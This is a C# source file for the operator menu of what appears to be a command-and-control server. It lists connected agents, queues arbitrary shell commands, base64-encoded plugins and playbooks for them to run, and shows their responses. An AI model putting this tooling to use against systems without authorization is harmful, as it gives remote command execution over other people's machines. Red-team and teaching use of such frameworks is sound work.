using Spectre.Console;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
            Console.WriteLine(@"
__________                   __               __       _____                       
\______   \_______  ____    |__| ____   _____/  |_    /     \ _____ _______  ______
 |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\  /  \ /  \\__  \\_  __ \/  ___/
 |    |     |  | \(  <_> )  |  \  ___/\  \___|  |   /    Y    \/ __ \|  | \/\___ \ 
 |____|     |__|   \____/\__|  |\___  >\___  >__|   \____|__  (____  /__|  /____  >
                        \______|    \/     \/               \/     \/           \/
            ");
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*

            //the following are modified from Spectre Console docs
            // https://spectreconsole.net/widgets/table
            // https://spectreconsole.net/prompts/selection
            // Create a table
            var menuOptions = new Table();

            // Add some columns
            menuOptions.AddColumn("#");
            menuOptions.AddColumn(new TableColumn("Command"));
            string[] options = null;
            // Add some rows
            if (ListClients().Length == 0){
                menuOptions.AddRow("", "No Clients Registered. Some options are not shown");
                menuOptions.AddRow("1","[red]Exit[/]");
                menuOptions.AddRow("2","[blue]List all Clients[/]");
                options = new[] {"Exit", "List Clients"};
            } else {
                // Add some rows
                menuOptions.AddRow("1","[red]Exit[/]");
                menuOptions.AddRow("2","[blue]List all Clients[/]");
                menuOptions.AddRow("3", "[fuchsia]List Available Plugins[/]");
                menuOptions.AddRow("4","[green]Command[/]");
                menuOptions.AddRow("5","[purple]View Responses[/]");
                options = new[] {"Exit", "List Clients", "List Available Plugins", "Command", "View Responses"};
            }

            // Render the tables to the console
            AnsiConsole.Write(menuOptions);
            // added a prompt for the menu
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("What would you like to do?")
                    .PageSize(10)
                    .AddChoices(options));
            return prompt;
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                string input = Menu();
                // only list all options if there are registered clients
                if (ListClients().Length != 0){
                    switch(input){
                        case "Exit":
                            //exiting our loop here will terminate the server
                            menuLoop = false;
                            break;
                        case "List Clients":
                            var clients = new Table();
                            clients.AddColumn("Registered Clients");
                            foreach(var agent in ListClients()){
                                clients.AddRow(agent);
                            }
                            AnsiConsole.Write(clients);
                            break;
                        case "Command":
                            SetCommand();
                            break;
                        case "View Responses":
                            var comT = new Table();
                            ViewResponses();
                            break;
                        case "List Available Plugins":
                            var plugins = new Table();
                            if (ListPlugins().Length != 0) {
                                plugins.AddColumn("Installed Plugins");
                                foreach(var plugin in ListPlugins()){
                                    plugins.AddRow(plugin);
                                }
                            } else {
                                plugins.AddColumn("No plugins installed! Compile and place plugins in the listener's plugin folder!");
                            }
                            AnsiConsole.Write(plugins);
                            break;
                        default: 
                            Console.WriteLine("\nInvalid input; Please try again.");
                            break;
                    }
                } else {
                    switch(input){
                        case "Exit":
                            //exiting our loop here will terminate the server
                            menuLoop = false;
                            break;
                        case "List Clients":
                            var clients = new Table();
                            clients.AddColumn("Registered Clients");
                            foreach(var agent in ListClients()){
                                clients.AddRow(agent);
                            }
                            AnsiConsole.Write(clients);
                            break;
                        default: 
                            Console.WriteLine("\nInvalid input; Please try again.");
                            break;
                    }
                }
            }
        }
        public int SetCommand(){

            //prevent user from running plugins or playbooks if they dont exist
            string[] options = null;
            if (ListPlugins().Length == 0){
                options = new[] {"Console Command"};
            } else if (ListPlaybooks().Length == 0){
                options = new[] {"Console Command", "Plugin"};
            } else {
                options = new[] {"Console Command", "Plugin", "Playbook"};
            }

            //set a command for a client to query
            var firstprompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Would you like to run a console command, one plugin, or a playbook?")
                    .PageSize(10)
                    .AddChoices(options)
            );
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you would like to send a command to")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );

            if(firstprompt == "Console Command"){
                if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                    var command = AnsiConsole.Ask<string>("Enter the console [red]command to run:[/] ");
                    string[] c_command = {command, "console"};
                    agent.commandQue.AddLast(c_command);
                    Console.WriteLine("\n");
                    return 0;
                }
                //error if agent is not found for one reason or another
                return 1;
            } else if(firstprompt == "Plugin") {
                string thirdprompt = "";
                string fourthprompt = "";
                string input = "";
                if (ListPlugins().Length != 0){
                    thirdprompt = AnsiConsole.Prompt(
                        new SelectionPrompt<string>()
                            .Title("Select the plugin to run:")
                            .PageSize(10)
                            .AddChoices(ListPlugins())
                    );
                    fourthprompt = AnsiConsole.Prompt(
                        new SelectionPrompt<string>()
                            .Title("Provide plugin input? ")
                            .PageSize(10)
                            .AddChoices(new [] {"Yes", "No"})
                    );
                    if (fourthprompt == "Yes"){
                        input = AnsiConsole.Ask<string>("Enter plugin [red]input:[/] ");
                    }

                    if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                        //add plugin to command que
                        //should add the specific function to be run by the plugin
                        //but that's for later
                        agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(this.listener.pluginDict[thirdprompt]), "plugin", input});
                        Console.WriteLine("\n");
                        return 0;
                    } else {
                        return 1;
                    }
                } else {
                    return 1;
                }
                //this.listener.TransferPlugin(thirdprompt);
            } else if (firstprompt == "Playbook") {
                string thirdprompt = "";
                if (ListPlaybooks().Length != 0){
                    thirdprompt = AnsiConsole.Prompt(
                        new SelectionPrompt<string>()
                            .Title("Select the playbook to run:")
                            .PageSize(10)
                            .AddChoices(ListPlaybooks())
                    );
                    if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                        //que up the playbook plugins to run on the specific agent
                        var pb = new Playbook(thirdprompt);
                        //add each plugin in the playbook to the que
                        foreach (Playbook.playbookCommand p in pb.playbookQue){
                            if (p.type == "plugin"){
                                //add a plugin if it is a plugin
                                agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(this.listener.pluginDict[p.command.Key]), p.type});
                            } else if (p.type == "command"){
                                //add a command if it is a command
                                string[] c_command = {p.command.Key, "console"};
                                agent.commandQue.AddLast(c_command);
                            }
                        }
                        Console.WriteLine("\n");
                        return 0;
                    } else {
                        return 1;
                    }
                }
                return 0;
            } else {
                return 1;
            }
        }

        private string[] ListPlaybooks(){
            //shows available playbooks in the playbook folder
            return Directory.GetFiles($"{this.listener.playbookPath}", "*.json");
        }

        private string[] ListClients(){
            //Converts client list to a string array
            var agents = this.listener.agents;
            string[] agentArr = new string[agents.Count];
            int count = 0;
            foreach (var agent in agents){
                agentArr[count] = agent.Key;
                count++;
            }
            return agentArr;
        }

        private string[] ListPlugins(){
            //shows all plugins in the plugin dictionary
            var plugins = this.listener.pluginDict;
            string[] pluginArr = new string[plugins.Count];
            int count = 0;
            foreach(var plugin in plugins){
                pluginArr[count] = plugin.Key;
                count++;
            }
            return pluginArr;
        }

        public List<string> ViewResponses(){
            //return responses sent by each client
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you'd like to see responses from")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );
            if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                AnsiConsole.Markup($"Responses from [red]{agent.name}[/]:\n");
                foreach(var com in agent.commandResp){
                    Console.WriteLine(com);
                }
                Console.WriteLine("\n");
            }
            //return an empty list if the agent is not found
            return new List<string>();
        }
    }
}